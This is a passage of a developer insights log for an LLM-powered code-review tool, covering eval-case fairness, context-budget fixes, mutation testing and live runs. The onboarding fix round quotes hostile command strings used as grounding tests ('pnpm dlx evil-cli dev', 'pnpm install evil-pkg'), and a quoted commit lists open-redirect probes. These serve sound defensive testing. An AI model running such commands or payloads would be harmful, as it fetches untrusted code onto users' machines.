    0.25 on both cases regardless of how well the model actually did. **Fixed by merging**: one case
    (renamed `weak-token-and-weak-hashing-in-password-reset-service`) now carries BOTH expectations
    in its `expected_output` array; the other was deleted. Precision on the merged case measured
    0.5 across 3 repeated runs (up from 0.25), recall stayed 1/1/1 — exactly the arithmetic
    predicts: the twin bug now credits instead of counting as noise. Corpus is 16 cases.
  - **The general lesson: a `must_find` case built from ONE accepted finding is only fair when
    nothing else in scope is ALSO a real, findable issue.** A fixture (or a real PR) that
    deliberately or accidentally packs more than one genuine defect into a single file needs either
    one multi-expectation case covering all of them, or the defects split across files — never one
    single-expectation case per defect in a shared file, which punishes exactly the thoroughness a
    reviewer should be praised for. Worth checking before harvesting future finding-derived cases:
    does this file have another real, already-accepted finding on it?

### 2026-08-25 (a 166-file real PR 400'd every reviewer — the callers digest was unbounded)

- Running any agent on a genuinely large real PR (`Holubinka/dev-digest` #23, 166 files, 20545
  insertions — the branch this whole session's own work landed on) failed outright:
  `400 This endpoint's maximum context length is 200000 tokens. However, you requested about
  275558 tokens`. `reviewer-core`'s map-reduce mode exists exactly for this (chunks per file once a
  diff exceeds `DEFAULT_MAP_THRESHOLD_LINES`), but **all 5 built-in agents were seeded with
  `strategy: 'single-pass'` hardcoded**, so map-reduce never engaged for any of them regardless of
  diff size — fixed by switching Security Reviewer to `strategy: 'auto'` via `PUT /agents/:id`
  (`agents.strategy` was already a plain settable column; nothing to build).
- Auto-mode still failed the same way once map-reduce was engaged, at almost the same size
  (275246 tokens) — meaning the diff-per-chunk was NOT what was blowing the budget.
  `buildCallersDigest` (`modules/reviews/run-executor.ts`) is the actual cause: it queries
  `getCallerSignatures(repoId, changedFiles, 10)` with the diff's WHOLE file list (all 166), is
  built ONCE for the whole diff, and gets embedded UNCHANGED into every map-reduce chunk's prompt —
  so a 166-file PR pays the full 166-file callers digest on every single one of its 166 per-file
  calls. `getCallerSignatures`'s own `limit` param only bounds callers PER SYMBOL
  (`MAX_CALLERS_PER_SYMBOL`); nothing bounded the FILE COUNT feeding it. The doc comment on
  `buildCallersDigest` claimed the section "stays under ~600 tokens even on heavy PRs" — that math
  only worked if a PR had one symbol per file, and was never actually a real bound.
- **Fix:** `MAX_CALLERS_DIGEST_FILES = 40` caps `changedFiles` before it reaches
  `getCallerSignatures`; the cut is disclosed in the run's Live Log summary line ("N changed file(s)
  past the 40-file cap were not queried"), matching this repo's existing disclosure convention
  (`env_vars_truncated`, `package_scan.found`/`shown`). Re-ran the actual PR #23 review after the
  fix: no more 400, though it then hit two DIFFERENT one-off failures near the end of its ~166-call
  map-reduce run (a 600s per-call timeout, then a structured-output schema-validation failure on a
  separate attempt) — each is its own finding (the schema-validation one is
  `reviewer-core/INSIGHTS.md`'s `DEFAULT_REVIEW_MAX_RETRIES` entry, same day). Succeeded outright on
  `deepseek/deepseek-v4-flash` (34 min, $0.155, 13 findings, 0 failures across all 166 calls).
- **The general shape, worth remembering past this one fix:** a value built ONCE per diff and reused
  unchanged across every map-reduce chunk pays its full cost on EVERY chunk, not once per diff — the
  cost model for "is this digest cheap enough to attach" has to account for chunk count, not just
  digest size. Any other per-diff enrichment added to the map-reduce path later (repo map, file
  rank) should be checked against the same question before assuming a fixed budget is "obviously"
  fine.

### 2026-08-23 (L06 eval pipeline — server, plan 16 package P2)

- Built `modules/eval/` (repository, scoring, diff-fragment, batch-executor, service, routes) plus
  the three `_shared/` extractions the slice needed. Four entries above came out of it.
- **`sliceDiff(diff, path)` returns the WHOLE `diff.raw` when `path` is absent**
  (`reviewer-core/src/review/reduce.ts:70`). Every caller that means "exactly this file" must
  assert the path is in `diff.files` first; `eval/diff-fragment.ts:fragmentFor` does, and
  removing that check silently turns a one-file eval case into the entire PR diff with no error
  anywhere. The fallback is right for the map-reduce caller it was written for and wrong for
  every other one.
- **`db.execute<T>` constrains `T` to `Record<string, unknown>`**, so a hand-written row interface
  needs an `[column: string]: unknown` index signature or `tsc` fails with TS2344. Not a claim
  that extra columns arrive — the SELECT lists them all.
- The batch executor is `*-executor.ts`, so `no-service-to-adapter-impl` forbids it importing
  `adapters/git/diff-parser.js`. The parse lives in `eval/diff-fragment.ts`, a plain module in the
  same slice; the rule matches the DIRECT edge only, so the executor calling into that module is
  legal and is the sanctioned escape.
- Exercised through the running dev API rather than only through tests: two eval cases now exist
  in the development database, created from real accepted/dismissed findings via
  `POST /findings/:id/eval-case`. No batch was run — that is a real paid model call.

### 2026-08-03 (conventions extractor)

- Built the conventions extractor. The lesson that transfers: **what PageRank calls important
  and what teaches a convention are different things.** `repoIntel.getConventionSamples` returns
  the most-imported files, which in this repo are barrels and `styles.ts` — the first scans
  produced "components are named in PascalCase". `ConventionsService.samplePaths` now
  over-fetches the ranking and filters `/index.ts`, `/styles.ts`, `.d.ts` and anything under
  400 characters.
- **Re-anchoring a quote is worth more than any prompt wording.** Measured over one scan of this
  repo: 21 of the surviving evidence sites were cited at the wrong line number. Dropping a claim
  whose line is wrong, instead of searching the file for the snippet and correcting it, would
  have left the feature with almost nothing to show.
- **A cheap model is not a free model.** Same prompt, same gates, one scan each:
  `openai/gpt-4o-mini` returned 10 rules of which 3 survived grounding, mostly framework
  defaults; `anthropic/claude-haiku-4.5` returned 15 of which 11 survived, naming `AppError`,
  the error envelope and `satisfies`. Same price tier. The registry default moved to haiku.
- A 60k-token sample block never returned inside the 120s ceiling; 24k with 6k per file returns
  in 15-40s. A file's conventions are in its first hundred lines or they are not conventions.

### 2026-08-03

- Landed the skills module and closed two of its own security holes, both found by
  `/pr-self-review` and both of which had passed their own tests — see the entry under What
  Doesn't Work, which is the transferable half.
- `server/src/platform/skill-injection.ts` sits in `platform/`, not in `modules/skills/`,
  because `modules/reviews/run-executor.ts` also has to filter a hijacking body out of prompt
  assembly and `no-cross-module` forbids the import. Three independent locks exist on purpose:
  the service refuses to enable, the reviews filter drops it at assembly, and the UI explains
  why. Its docblock says plainly it is a seatbelt for a careless import, not a security
  boundary — do not let that sentence get edited out.
- `SkillsService` takes its repository as a defaulted constructor parameter
  (`repo = new SkillsRepository(container.db)`), the first service here to do so. That is what
  made `skills-service.test.ts` possible without Docker; the three untested services all build
  their own.
- The `arch` gate caught `modules/skills/service.ts → adapters/tokenizer/index.ts`
  (`no-service-to-adapter-impl`). Using `this.container.tokenizer.count()` fixed the violation
  and produced an exact token count rather than the `length / 4` estimate.

### 2026-08-05

- Landed the intent pre-pass (spec 05, steps 5, 6, 8, 9, 10, 12, 15). The two arch lessons
  above are the transferable half; both were found by `pnpm arch`, not by review.
- `buildApp` overrides do **not** cover an unmocked provider. Before this change no test path
  resolved `openrouter`, so `reviews.it.test.ts` never noticed; the intent pre-pass resolves
  `review_intent` → `openrouter` on every review, and `LocalSecretsProvider` reads
  `~/.devdigest/secrets.json` regardless of `NODE_ENV`. On a machine with a real key the suite
  would have made live requests. `appWith` now passes `secrets: new MockSecretsProvider({})`.
  **Any integration test that triggers a review needs it.**
- `MockLLMProvider`'s `id` union is `'openai' | 'anthropic'`, so a mock cannot *be* an
  OpenRouter provider — but `overrides.llm` is keyed independently, so
  `llm: { openrouter: new MockLLMProvider('openai', …) }` is the working form. The key is what
  `container.llm` resolves on; the `id` only reaches traces.
- `MockGitClient.readFile` returns `''` for an unknown path where `SimpleGitClient` throws
  ENOENT. A "file missing" degrade path tested only against the mock therefore passes while
  reading a phantom empty file. `IntentService.readPlanFiles` treats a blank read as absent,
  which makes the two behave the same.
- Later the same day: capped the classifier's PR body (4000) and linked issue (2000 body / 300
  title) in `modules/intent/constants.ts`, closing the Open Question the previous dispatch left.
  The three cap tests were each proved to fail with the cap removed before being left green.
- The `MockSecretsProvider` note above was only half-applied: `reviews.it.test.ts` had it,
  `reviews-skills.it.test.ts` did not, and that one omission was making the integration suite
  hit the live OpenRouter API. Full entry under Recurring Errors & Fixes. When an INSIGHTS entry
  says "any test that does X needs Y", grep for X — `grep -ln '/review' test/*.it.test.ts` takes
  a second and would have found it.
- Later still, applying six review findings to the same uncommitted change: the two bullets above
  were both treating a symptom. `ContainerOverrides.llmFallback` replaced them as the mechanism —
  see the dated correction under Recurring Errors & Fixes, which is the transferable half.
- `modules/settings/feature-models.ts` was left behind as a one-line re-export of
  `_shared/feature-models.ts` so one test kept resolving. It was deleted: it had zero production
  importers, and **no module outside `settings/` could legally import it** — `no-cross-module`
  fails that edge — so the specifier it advertised was a trap for the next consumer, not a
  compatibility shim. A re-export whose only importer is a test is a test import to retarget.
- Every new assertion in this pass was proved falsifiable before being left green: deleting the
  `llmFallback` lookup from `Container.llm` failed exactly three cases across
  `reviews.it.test.ts` and `reviews-skills.it.test.ts`, and swapping `resolveFeatureModel` for
  `defaultFeatureModel` in `IntentService.derive` failed exactly the new
  `intent.it.test.ts` override walk with `expected 'z-ai/glm-4.7-flash' to be
  'minimax/minimax-m2.5'`.


### 2026-08-09 (blast radius — the server slice)

- Steps 5-10 of `plans/07-blast-radius.md`: the `blast/` slice, its structural container port and
  the two routes. `pnpm arch` clean with the baseline unchanged at 19, typecheck clean, 520 unit
  and 98 integration tests green.
- **The assertion that matters is not in the unit file.** `test/blast-service.test.ts` fakes
  `RepoIntel`, so it can only assert what a fake returns — and the fake is exactly where the
  `caller_count` defect above was hiding. `test/blast.it.test.ts` seeds 21 real `references` rows
  and asserts `truncated: true` comes back over HTTP; that is the one that would have caught it.
- Thirteen mutations across `blast/helpers.ts`, `blast/service.ts`, `blast/repository.ts` and
  `repo-intel/service.ts` were each proven red and restored. Four minutes, and every mutation
  produced a failure — which is the point of doing it: it converts "the tests pass" into "the
  tests would notice".
- Live check against the dev API, `Holubinka/dev-digest` PR #12: `full`, 30 symbols, 38 endpoints,
  `ReviewService` at `server/src/modules/reviews/service.ts:28` with callers at `app.ts:81` and
  `reviews/routes.ts:22`, in **22 ms** — Postgres only, which is what acceptance criterion 4 asks
  for. Note the spec's own line numbers had already rotted (it says `app.ts:83`, `service.ts` for
  the declaration); the response is the source of truth.

### 2026-08-09 (four majors from the self-review, fixed)

- `diff-review.ts` (two 422 branches → four, plus a 409 for an empty agent list) and
  `blast/helpers.ts` (three prototype-safe reads, two endpoint caps, `totals` taking its keys as
  parameters). New hermetic suites: `test/reviews-diff-guard.test.ts`, `test/blast-helpers.test.ts`.
- **Reproducing first paid for itself twice.** The prescribed fix for the DoS was a whole-diff
  total; running it against the real functions showed a 95-byte body that walks straight past it
  (entry above). And the reproduction of the `toString` finding turned up a *fourth* site the
  report had not named — `factsByFile[file]`, which throws rather than corrupting a number.
- Nine mutations (eight server, one client) each proven red and restored. The one that took
  1470 ms to fail is the honest-file-in-front case: the test was slow precisely because the
  vulnerability was running.
- The exit-code contract was verified by driving `runCli` with a stubbed `fetch`: the new 409 maps
  to `EXIT_UNAVAILABLE` (2), while the pre-fix 200-with-`reviews: []` returned 0 and printed "No
  blocking findings across 0 agent(s)." — a pre-commit hook would have passed on an unreviewed
  diff.
- Live against the dev API: the 49-byte body is refused in ~20 ms with the new message, and
  `GET /pulls/:id/blast` on PR 5 (`Holubinka/dev-digest`) serves 15 symbols carrying the new
  `endpoint_count` / `endpoints_truncated` fields.

### 2026-08-14 (project context — fix round 1)

- Four of the five findings were about a **claim in a comment that the code did not honour**:
  "`RunTrace` is parsed on READ" (it was cast), "deny by default" (only the read path had it),
  "claim the scan row" (an `onConflictDoNothing` that wrote nothing on the row it was aimed at).
  A comment asserting a mechanism is worth grepping for the mechanism.
- **The database was cheaper evidence than the API.** The trace sweep over
  `GET /runs/:id/trace` tripped the 120 req/min rate limit and silently skipped the traces it
  could not fetch — the counts looked complete and were not. `docker exec devdigest-postgres
  psql -U devdigest -d devdigest -At -c "…"` answered the same question exactly, in one query
  (285 rows, 282 without `project_context`, 0 without `specs_read`).
- The brief said `specs_read` was missing from the same old documents. It is not: **0 of 285**
  lack it. Adding a `.default([])` for it would have been an unrequested contract change made on
  an unverified premise.
- Making the run path require a scanned row changed what four existing integration tests were
  actually testing: they attached documents to a repository nobody had scanned. They now call
  `scanRepo(app, repo.id)` first, which is what a user does by opening the page.
- "While the scan is in flight" cannot be asserted by reading straight after `POST /rescan` —
  the job can finish first. `test/context.it.test.ts` builds a second app over the same database
  whose `git.listFiles` awaits a promise the test resolves, so the in-flight state is chosen
  rather than raced for.

### 2026-08-14 (project-context authoring, P1 of plan 09)

- The server write path for Project Context: `GitClient.writeFile` / `makeDir`, four routes, the
  `repo_doc_edits` durability record, and `.devdigest` as an unconditional scan root.
- **Durability here is the file, not a row.** An untracked file under `.devdigest/` survives
  `refresh()` (`clone()` only fetches when `.git` exists) and `resyncRepo()` (`reset --hard` does not
  touch untracked files). `repo_doc_edits` stores no text — only `created_here` and a sha256 — and
  would not bring a document back. A full re-clone destroys it, and that is an accepted loss.
- **`sync()`'s comment "safe here because we never commit to or run code from the clone" stopped
  being true with this change and was corrected in the same commit** (`adapters/git/simple-git.ts`).
  `reset --hard` is safe for the untracked documents this feature writes and DESTROYS an edit to a
  tracked one, silently — which is the erasure `AC-70` warns about before a save and `AC-71` reports
  after one. A comment asserting a mechanism is worth grepping for the mechanism.
- **Proving a new test fails first paid for itself twice.** Mutating `writeTarget`'s symlink check to
  `if (false)` turned 3 of 14 containment cases red AND planted a file at the link's destination;
  mutating `writeZone`, the upload NUL check and `baseName` turned 5 of 23 service cases red. Two
  extra turns for evidence that 37 new assertions are not vacuous.
- `created_here` is written with `ON CONFLICT ... SET created_here = repo_doc_edits.created_here OR
  excluded.created_here`. A save arrives with `createdHere: false` — it is a save, not a create — and
  a plain assignment would quietly turn a local-only document into one the page claims the
  repository carries. There is no delete to undo it with.

### 2026-08-16 (PR why + risk brief, P2 of plan 10 — server)

- `pr_brief` was reshaped rather than replaced: it had zero readers and zero writers since
  `0000_init.sql`, so the `NOT NULL` columns needed no backfill anywhere the table exists.
- Two helpers moved to `_shared/` for the same reason step 2 of the plan moved the budget walk:
  `no-cross-module` follows `import type`. `selectWithinBudget`/`truncateToBudget` →
  `_shared/budget.ts` with the failure status as a type parameter, and `parsePlanRefs` /
  `sanitizeMarkdownRepoPath` → `_shared/plan-refs.ts` with the caps as parameters.
  `modules/intent/helpers.ts` re-exports both bound to its own numbers, so
  `test/intent-helpers.test.ts` passes unchanged — which is the proof the move was
  behaviour-preserving. Copying the plan-ref parser instead would have been a third copy of a
  traversal gate; sourcing the paths from `IntentRecord.plan_refs` instead would have made
  `specs: included` unreachable whenever `intent: missing`, a quadrant the contract reports.
- The brief prompt uses `*` bullets and never `-`. AC-17 ("no hunk, no patch body") is checkable
  from the outside only as "no line of the assembled input looks like a diff line", and a markdown
  `- ` bullet makes that assertion impossible to write.
- Twenty-two mutations were run against the new suites before leaving them green; two did not
  fail and both were real gaps, now closed: the service suite could not tell `fit.included` from
  the raw blocks (no block was being dropped in its fixture), and the eviction guard had no case
  where the new row was not the newest.
- Proven live against `localhost:3001`: `POST /pulls/:id/brief` computed in 14 s
  (`input_tokens_counted: 5463` of 8000, `tokens_in: 6364`, `attempts: 1`, one row), five GETs
  afterwards left `computed_at` and `cost_usd` byte-identical, and an earlier POST returned
  `502 Operation timed out after 45000ms` — the named 45 s clock of R43 firing against a real
  provider, not a test double.

### 2026-08-16 (risk brief — fix round 4)

- Two majors from the third `/pr-self-review`, both in code the first three rounds had walked
  past: the 8000-token budget was not a bound (`diff_stats` exempt from `DROP_ORDER` and
  therefore unbounded), and the route was building the object graph for a service with instance
  state. Both entries are under Codebase Patterns above.
- **The grounding invariant was the trap, not the finding.** Round 3 turned
  `[...buildAllowedRefs(fit.included)].filter(r => !fit.user.includes(r))` into
  `test/brief-allowed-refs.test.ts`; the naive shape of the budget fix — shorten the text, leave
  `refs` alone — breaks it, and the existing cases did NOT catch that, because none of them cut
  the diff-stats list. The missing case was added ("holds when the budget shortens the diff-stats
  path list") rather than assumed present. A fourth break of that invariant in four rounds.
- Every new case was proved able to fail before being left green, by disabling the shrink loop
  and by reverting the container getter to the old route-side semantics: 32685 vs 8000 with
  `count = s => s.length`, `'included'` vs `'truncated'`, `404` vs `200`, and two distinct
  `BriefService` objects where one was expected.
- `pnpm typecheck` covers `src/**/*.ts` only, so the ~30 rewritten call sites in
  `test/brief-service.test.ts` were checked by running them, not by `tsc` (already recorded under
  Recurring Errors as "Correction (2026-07-27)").
- Proven live again on the new code: `POST /pulls/:id/brief` for `Holubinka/dev-digest` PR #20,
  HTTP 200 in 10.2 s, `input_tokens_counted: 5463` of 8000, `tokens_in: 5718`, `attempts: 1`,
  `cost_usd: 0.0011`, `diff_stats: included (40 path(s) of 170)` — an ordinary PR is untouched by
  the shrink, which is what a ceiling should look like.

### 2026-08-17 (onboarding tour, plan 12 P5 — one call, and the object out of it)

- **Proven live, and the live run is the only thing that found anything.** One
  `OnboardingGenerateExecutor.run` against `Holubinka/dev-digest` through a real `Container`:
  50 s, `openrouter` / `deepseek/deepseek-v4-flash`, `attempts: 1`, `input_tokens_counted: 23523`
  of 24000, `tokens_in: 25856`, `cost_usd: 0.0027`, five sections `ready`, every one of the 18
  link paths, 3 task paths, 3 flow steps and 3 reading-path items openable in the clone, all five
  `dropped` counters zero, 20 probes. The 17 unit tests were green before that run and stayed
  green after it, and they could not have told me what it told me — see the `getRepoMap` entry
  under *What Doesn't Work*.
- **This repository has no root `package.json`**, so `package_scan.found` is 5, not 6, and the
  "root package is the first block" rule (AC-94) never fires here at all — it is covered by a
  fixture in `test/onboarding-packages.test.ts` and by nothing else. Plan 12's `## Verification`
  item 8 asks for 6; the number is wrong, not the code.
- The model wrote three setup commands and all three survived grounding, including
  `docker compose up -d postgres` — authorised by `docker-compose.yml` declaring that service.
  `env_vars_truncated` came back `true` on the first real generation, exactly as the contract's
  docstring predicted from `server/.env.example` declaring thirteen keys against a ceiling of 12.
- Five negative controls were applied by hand to `generate-executor.ts` and each turned exactly
  one case red: no probe cap, `attempts: 1` instead of the provider's, warning on the wrong
  tokenizer id, a budget that forgets the user scaffold, and the walk's own cut instead of the
  fence-aware one. The mutations are listed in the test file's docstring.

### 2026-08-18 — onboarding fix round 1 (seven findings against `plans/12`)

- Four findings were security defects the reviewer had already reproduced with a throwaway test.
  Re-running the reviewer's own strings against the fixed code, rather than only asserting the
  new behaviour, is what confirmed the fix addressed the reported input and not a paraphrase of
  it: `pnpm install evil-pkg` → `install_command: null`, `pnpm dlx evil-cli dev` → dropped,
  `cp .env.example server/src/index.ts` → dropped, both mockup lines kept verbatim.
- Each new test was proved red before being left green, by reverting the predicate it covers:
  five in `onboarding-grounding.test.ts` and five across `git-list-files.test.ts` /
  `onboarding-gather.test.ts`. The depth-sort revert failed two PRE-EXISTING cases as well
  ("counts depth from each root"), which is how the ordering change was shown to be observable
  rather than incidental.
- Changing the `listFiles` result shape touched no call site that destructures `{ files, bounded }`
  — `modules/context/scan-executor.ts` compiled unchanged — but it did rewrite the expected
  ORDER in three suites, `git-read-containment.test.ts` included. A port's sort order is part of
  its contract in practice even where no docstring said so.
- Allowing a trailing `#` comment on a command is safe here for a structural reason worth keeping:
  nothing is stored as the model wrote it. Every surviving command is `tokens(cmd).join(' ')`, and
  `tokens()` splits on `/\s+/`, so a newline — the one character that would turn the tail back
  into a second instruction — cannot reach the rendered string.

### 2026-08-18 (onboarding tour — HTTP, persistence, the index gate)

- Built plan 13's `modules/onboarding` API half: the `onboarding-api.ts` contract in both
  vendored copies, `types.ts` / `status.ts` / `repository.ts` / `service.ts` / `routes.ts`, two
  container getters, the module registration and the README row. Six test files, 52 new cases.
- **Exercised end to end against the running dev API, not only through fakes.** One real
  generation on `Holubinka/dev-digest`: 200 in 122s, `deepseek/deepseek-v4-flash`, 23 377
  provider tokens, `cost_usd` 0.00582, all five sections `ready`. The cached read after it is
  7–13ms and byte-identical to the POST body — the p95 < 150ms NFR has ~10x of headroom. All
  three refusals answered in 5–13ms with no model call. A generation that failed upstream
  returned 502 after 111s and left `generated_at` unchanged, which is AC-51/AC-60 proved on real
  rows rather than on a fake.
- **The three mutations worth the two extra turns.** Removing the `lastIndexedSha === ''` guard,
  renaming `index_state` to `packages` in the `.extend()`, and deleting the in-flight join each
  turned exactly one assertion red. The contract collision was the one to check: it produces a
  VALID Zod schema and no error in either package, so `onboarding-contract.test.ts` is the only
  thing in the repository that can see it.
- Full `.it.test` runs failed 1–4 cases in `test/reviews-context.it.test.ts`
  (`GET /runs/:id` → 404 via `waitForPrRuns` returning on timeout). It passes 9/9 alone, and it
  fails the same way with the two new onboarding files EXCLUDED — pre-existing load sensitivity,
  not a regression. That file already carries `llmFallback` and `MockSecretsProvider({})`, so it
  is not the live-OpenRouter cause recorded above.

### 2026-08-18 (onboarding tour · depth, P3 — budget, clock, chains, task details)

- **The real run answered the spec's own hypothesis.** `Holubinka/dev-digest`, 656 indexed files,
  one `POST /repos/:id/onboarding/generate`: budget **32 528** (the formula's predicted number),
  `chains_supplied` **20**, `longest_chain_files` **5**, `file_samples` **19 of 19**,
  `project_docs` **7 of 7** with five shortened by `MAX_DOC_CHARS`, `input_tokens_counted`
  **30 879** against the 32 528 ceiling, `duration_ms` **80 702** against a computed clock of
  219 360, `cost_usd` **$0.0076** (**$0.0117** if scaled to the ceiling budget — the $0.02 bound
  holds). The tour drew **14** flows where the old `MAX_FLOWS = 4` allowed four.
- **Splitting the chains per block cost less than estimated.** Twenty per-chain blocks, each
  repeating the `## Critical path chains` heading and its own fence, still left every one of the
  nineteen samples shipping whole — the plan budgeted for losing one (AC-41 asks for ≥18 of 19).
- **The model wrote commands into task steps and none was rejected**: `dropped.unknown_script`
  was **0**, and every command in a step (`pnpm dev`, `pnpm test`, `pnpm typecheck`, `pnpm lint`,
  `npm run build`, `npm test`, `npm run typecheck`) was verbatim one "How to run" had already
  grounded. Grounding a step's command by MEMBERSHIP in that set — rather than by re-checking its
  shape — is what makes the newest surface unable to weaken the four gates closed on 2026-08-18.
- **What the run did NOT exercise: a step's `path`.** All three tasks came back with `path: null`
  on every step, so the "a step whose path failed keeps its text and counts `unknown_path`" branch
  is proved by `test/onboarding-grounding.test.ts` and by nothing that has run against a real
  model yet. The same run left `dropped.unknown_path` at 10, up from 0 before this change, which
  is what twenty chains' worth of extra claims looks like.
- **Three tasks, not six.** `MAX_TASKS` is 6 and the model returned 3. The cap is not what bounds
  this screen on this repository; the model's own judgement is.

### 2026-08-23

- **An accepted finding's own title can misdescribe the vulnerability it was accepted for, and an
  eval case built from it inherits the wrong target.** `SPEC-05-eval-pipeline.md`'s dataset
  (AC-74) includes `open-redirect-via-finding-file-path`, built from an accepted finding on
  `client/src/components/findings-preview/FileRef.tsx` (PR #5). `FileRef.tsx` only renders an
  `href` prop — it does not construct one — so no amount of prompt tuning made any model report
  on it, and reading why turned up the fix commit for the original finding, 18 minutes later in the
  same PR (`1d5348d`): *"A review flagged the citation links as an open redirect... That part does
  not hold: the origin is a literal prefix... so `//evil.com`, `https://phishing.com`... all
  resolve to origin `https://github.com`... Still github.com, so not a redirect off site, but the
  citation read as one repo and opened another."* The real defect was a dot-segment path traversal
  in `client/src/lib/github-urls.ts` (fixed the same commit, `hasDotSegment`), not an open redirect,
  and not in the file the eval case cited. The case was retired (`DELETE /eval-cases/:id`) rather
  than patched: rebuilding it around `github-urls.ts`'s pre-fix state would need a fabricated diff
  (no real PR introduced that file in isolation — it shipped in the initial squashed snapshot), and
  the repo's stance is no fabricated eval data (`SPEC-05-eval-pipeline.md` D11). Set: 14 → 13, still
  well over AC-74's 8. **Worth generalising**: an accepted finding's `title` is not proof its stated
  mechanism was correct, only that a human agreed something in that region was worth fixing — the
  fix commit's own message is a source worth reading before trusting a finding's framing into a
  regression test, and this is the kind of drift a growing eval set will keep surfacing as the
  codebase around an old accepted finding gets patched out from under it.

### 2026-08-23 (skill's own Evals tab — the reciprocal view, L06 follow-up)

- Built `GET /skills/:id/eval-cases` — the mirror of `GET /agents/:id/eval-cases`, but spanning
  every agent: every case whose LATEST run had a given skill active, not the cases of one owner.
  Full stack: `SkillEvalCaseRow`/`SkillEvalCaseSet` contracts (both vendored copies),
  `EvalRepository.casesForSkill` (see the `DISTINCT ON` entry above — this method is what that
  entry is about), `EvalService.listCasesForSkill`, the route, and a new `skillsRepo` port on
  `EvalContainer` for the 404 check.
- **`SkillsService` builds its own `SkillsRepository` inline** (`modules/skills/service.ts:60`,
  `new SkillsRepository(container.db)` as a constructor default) rather than reading it off
  `Container`, unlike `agentsRepo`/`reviewRepo`/`pullsRepo`, which are all lazy getters on
  `platform/container.ts`. Reaching `SkillsRepository.existsInWorkspace` from another module's
  `Container`-typed port needed adding `container.skillsRepo` as a getter FIRST
  (`platform/container.ts:198`) — the getter did not already exist because nothing outside the
  skills module had needed one yet.
- Proved the query design with a real regression, not just a read: bind a skill, run a case
  (passes, skill recorded), unbind the skill, run again (skill absent from the true latest run),
  then assert the skill's list is empty. The naive filter-inside-`DISTINCT-ON` version keeps
  listing the case off the stale first run; only a two-run scenario against real Postgres
  distinguishes it from the correct version, since a single run can't expose the ordering bug —
  see `test/eval-routes.it.test.ts`, "a case whose CURRENT latest run dropped the skill is absent".

## Open Questions

- **Security Reviewer's `deepseek/deepseek-v4-flash` has a prompt-resistant prior: shell `case`
  pattern-matching and plain string-building near security code reads as "injection"/"code
  execution" to it, regardless of wording.** Four `must_not_flag` cases fail this way as of
  2026-08-24 (`gate-sh-does-not-validate…`, `wrapuntrusted-fence-can-be-broken…`,
  `report-sh-uses-jq-r…`, `scope-sh-s-flag-for-function…`), 0/6 to 0/2 individually sampled, before
  AND after a maximally-explicit "name the sink or drop it" rule that had zero measured effect (see
  Session Notes above). Also true of the TOCTOU cross-method case from earlier the same day (0/17
  total). Two candidates not yet tried: a different model tier for this agent specifically (the
  Performance Reviewer investigation found `deepseek` outperforming `gpt-4o-mini` and even
  `claude-sonnet-4.5` on ITS cases, but that was never re-checked against Security Reviewer's
  specific failure shape), or accepting these four as permanently-flaky `must_not_flag` cases and
  excluding them from the pass/fail gate while keeping them for manual spot-checks. Whichever way
  this goes, don't re-attempt the three prompt-only moves already tried and measured ineffective
  (rewording the label, a worked example naming the pattern, a sink-definition rule) without new
  evidence they'd behave differently this time.
  - **Resolved same day, by the first candidate suggested above.** Switching Security Reviewer's
    model from `gpt-4o-mini` to `claude-haiku-4.5` (same unmodified prompt) fixed all 4 cases, 3/3
    clean each. See the Session Notes entry "model swap fixes the case-injection family". The
    prompt-only interventions were never the wrong lever — the model was.

- Onboarding Tour, 2026-08-18: moving `project_docs` above `file_samples` made the documents'
  worst case dangerous where it used to be harmless. Before, an over-large document block was
  dropped at the tail and cost nothing; now it is served first and eats the samples. This
  repository has 5 packages → 7 documents → 7 077 tokens, 29 % of the budget. A monorepo at
  `MAX_PACKAGES` offers 14 documents, roughly 14 000 tokens, 58 % of it — leaving 8-9 of the 20
  samples. `MAX_DOC_CHARS` (4 000) bounds one document but nothing bounds the block. Whether
  `project_docs` needs a block-level ceiling of its own, the way `REPO_MAP_TOKEN_BUDGET` bounds the
  skeleton, is unanswered and wants a measurement on a real monorepo rather than a guess.

- **A scan claim outliving its process is bounded by time, not by liveness.**
  `SCAN_CLAIM_STALE_MS` (10 min) is the only thing that releases `repo_doc_scans.scanning_at`
  when a process is killed mid-scan, because nothing else knows the job is gone. A jobs-table
  lookup would be exact, but `modules/context` may not import `modules/jobs`
  (`no-cross-module`) and the `jobs` port it does have exposes only `enqueue`/`register`. Added
  2026-08-14 with the rescan fix; worth revisiting if the ports grow a "is this job still
  alive" question for another reason.

- The classifier's PR body and linked-issue text reach `renderClassifierInput` uncapped. Plan 05
  specifies caps only for plan/spec files (3 × 6000 code points), and `assemblePrompt` caps
  `prDescription` at 4000 — so the review path is bounded and the intent path is not. A 65k-char
  body is attacker-controlled input to a paid call. Deliberately not "fixed" during
  implementation because picking a number the plan did not pick is a design decision, not a bug
  fix. Raised for review 2026-08-05.
  - **Closed 2026-08-05.** The numbers were chosen outside the plan and implemented:
    `MAX_PR_BODY_CHARS = 4000` (deliberately equal to `MAX_PR_DESCRIPTION_CHARS` in
    `reviewer-core/src/prompt.ts:37`, so the classifier never reads more of the body than the
    reviewer does), `MAX_ISSUE_BODY_CHARS = 2000`, `MAX_ISSUE_TITLE_CHARS = 300`, all in
    `modules/intent/constants.ts` and applied in `renderClassifierInput`. Commit subjects and
    changed-file paths are still capped by COUNT only (20 / 40) and not by length — a
    thousand-character commit subject is possible and is nobody's cap today.
  - **Fully closed 2026-08-06**, over three further `/pr-self-review` rounds, each of which found
    exactly one of the remaining gaps: `MAX_COMMIT_SUBJECT_CHARS = 200`, then
    `MAX_FILE_PATH_CHARS = 400` and `MAX_PR_TITLE_CHARS = 300`. The title was nobody's finding
    until the fourth round — it was never on the list above, because the list was written from
    what the plan named rather than from what the function reads.

    **The lesson is the shape, not the numbers.** Writing "still capped by COUNT only" and
    leaving it is what made the next two rounds necessary: a known gap recorded and not closed
    reads, one release later, exactly like a gap nobody knew about. The countermeasure is in
    `test/intent-helpers.test.ts` — one test feeds every source oversized at once and asserts the
    **set of `<untrusted>` labels** equals a table of per-label ceilings, so a source added
    without a cap fails there rather than in a fifth review round. The same instinct is now in
    the `security` agent's brief (`.claude/skills/pr-self-review/routing.md` §1): enumerate the
    inputs on a path and name each bound, rather than searching for one unbounded one.

- **`test/helpers/runs.ts` has a race that `MockSecretsProvider` masked, not fixed.**
  `run-executor.ts` writes `completeAgentRun({ status: 'done' })` at `:294` and the
  `run_traces` document only *after* it. `waitForPrRuns` returns the moment a run is terminal
  (`runs.ts:30`), so `traceOf` in `reviews-skills.it.test.ts` can `GET /runs/:id/trace` inside
  that window and get a `404`. Measured 2026-08-05 over twenty full `.it.test` runs: **3 bad runs
  in 14 with the `llmFallback` change, 2 in 6 without it** — so it is pre-existing and unrelated,
